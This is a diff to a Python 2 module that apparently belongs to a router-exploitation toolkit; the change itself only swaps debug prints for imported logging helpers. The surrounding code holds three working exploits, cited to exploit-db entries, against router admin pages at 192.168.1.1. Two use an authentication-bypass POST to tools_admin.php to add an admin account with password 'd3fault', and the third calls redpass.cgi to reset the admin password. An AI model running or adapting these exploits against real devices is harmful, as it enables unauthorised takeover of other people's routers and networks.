@@ -1,4 +1,4 @@
-import util
+from util import Msg, Error, debug
 import urllib
 
 #
@@ -11,8 +11,7 @@ import urllib
 def run ( run ):
 	if run == 1:
 		# http://www.exploit-db.com/exploits/18638/
-		tmp = vulnerabilities()[run-1]
-		print '[dbg] running',tmp
+
 		print '[+] Adding admin \'admin\' with password \'d3fault\'...'
 		url = 'http://192.168.1.1:80/tools_admin.php?NO_NEED_AUTH=1&AUTH_GROUP=0'
 		params = urllib.urlencode({'ACTION_POST':1, 'admin_name':'admin', 'admin_password1':'d3fault',
@@ -20,8 +19,7 @@ def run ( run ):
 		try:
 			response = urllib.urlopen(url, params)
 		except Exception, j:
-			print '[-] Error connecting to host.'
-			print '[dbg] error: ', j
+			Error('Error connecting to host.')
 			return
 		print '[+] Done.  Connect to 192.168.1.1 with \'admin:d3fault\''
 		print '[!] Page returned: '
@@ -29,8 +27,7 @@ def run ( run ):
 
 	elif run == 2:
 		# http://www.exploit-db.com/exploits/15753/
-		tmp = vulnerabilities()[run-1]
-		print '[dbg] running', tmp
+
 		print '[+] Adding admin \'admin\' with password \'d3fault\'...'
 		url = 'http://192.168.1.1:80/tools_admin.php?NO_NEED_AUTH=1&AUTH_GROUP=0'
 		params = urllib.urlencode({'ACTION_POST':1, 'admin_name':'admin',
@@ -39,8 +36,7 @@ def run ( run ):
 		try:
 			response = urllib.urlopen(url, params)
 		except Exception, j:
-			print '[-] Error connecting to host.'
-			print '[dbg] error: ', j
+			Error('Error connecting to host.')
 			return
 		print '[+] Done.  Connect to 192.168.1.1 with \'admin:d3fault\''
 		print '[!] Page returned: '
@@ -48,15 +44,13 @@ def run ( run ):
 
 	elif run == 3:
 		# http://www.exploit-db.com/exploits/18499/
-		tmp = vulnerabilities()[run-1]
-		print '[dbg] running', tmp
+
 		print '[+] Changing \'admin\' password to \'d3fault\'...' 
 		url = 'http://192.168.1.1:80/redpass.cgi?sysPassword=d3fault&change=1'		
 		try:
 			response = urllib.urlopen(url)
 		except Exception, j:
-			print '[-] Error connecting to host.'
-			print '[dbg] error: ', j
+			Error('Error connecting to host.')
 			return
 		print '[+] Done.  Connect to 192.168.1.1 with \'admin:d3fault\''
 		print '[!] Page returned: '
